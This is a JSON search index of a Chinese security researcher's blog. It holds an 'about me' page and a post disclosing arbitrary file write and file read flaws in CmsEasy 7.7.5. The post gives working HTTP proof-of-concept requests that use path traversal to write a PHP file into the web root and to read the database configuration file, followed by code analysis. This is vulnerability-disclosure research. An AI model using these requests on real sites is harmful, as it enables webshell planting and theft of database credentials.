{"pages":[{"title":"关于我","text":"KeepOnFigthing --> jdr 2020年6月29日开始学习web安全。 2021年大学毕业。 至今仍是菜狗+单身狗。 喜欢打网球，白嫖资源。 现就职于一家安全公司，是一名安全服务工程师。 目前在学习代码审计，app安全，以及内网渗透。 B站: https://space.bilibili.com/486838364EDUSRC：https://src.sjtu.edu.cn/profile/8186/","link":"/about/index.html"}],"posts":[{"title":"CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞","text":"CmsEasy_7.7.5_20211012存在任意文件写入漏洞和任意文件读取漏洞 一、厂商官网cmseasy 二、安装包下载https://www.cmseasy.cn/download/ https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.5_UTF-8_20211012.zip 2.1 任意文件写入漏洞getshell后台漏洞，需登录。 2.2.1 任意文件写入漏洞poc12345678910POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96Content-Length: 57X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;Connection: closesid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt; .._d_ 代表 ../，此处用来路径穿越发送漏洞利用的poc数据包，响应内容是ok时，代表网站根目录下被写入了1.php文件。 访问http://192.168.31.96/1.php (或者是http://localhost/1.php)，此时发现phpinfo被成功执行。 2.2.2 任意文件写入漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入sid=#data_d_.._d_.._d_.._d_1.php，经过一轮的正则替换，最后tpl=data/../../../1.php post方法传入scontent=&lt;?php phpinfo();?&gt;，先通过编码实例化，再通过正则替换将单引号转义，此时content=&lt;?php phpinfo();?&gt;，这里的正则处理是对XSS漏洞的处理，对写入的php代码不生效。 当site=default时，代码执行到最外层else处（第2789行），此过程中，content值不变，通过file_put_contents造成了任意文件写入漏洞。 2.2 任意文件读取漏洞后台漏洞，需登录。 2.2.1 任意文件读取漏洞poc12345678910POST /index.php?case=template&amp;act=fetch&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4; Connection: closeContent-Length: 32id=#data_d_.._d_.._d_.._d_config_d_config_database.php .._d_ 代表 ../，此处用来路径穿越 发送漏洞利用的poc数据包响应内容是cmseasy网站配置文件config/config_database.php的文件内容信息。该响应信息中包含了数据库连接地址账号以及密码。 2.2.2 任意文件读取漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入id=#data_d_.._d_.._d_.._d_config_d_config_database.php 通过一系列的正则替换tpl=data/../../../config/config_database.php 最后通过第2757行的file_get_contents函数读取到了配置文件信息。","link":"/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"}],"tags":[],"categories":[]}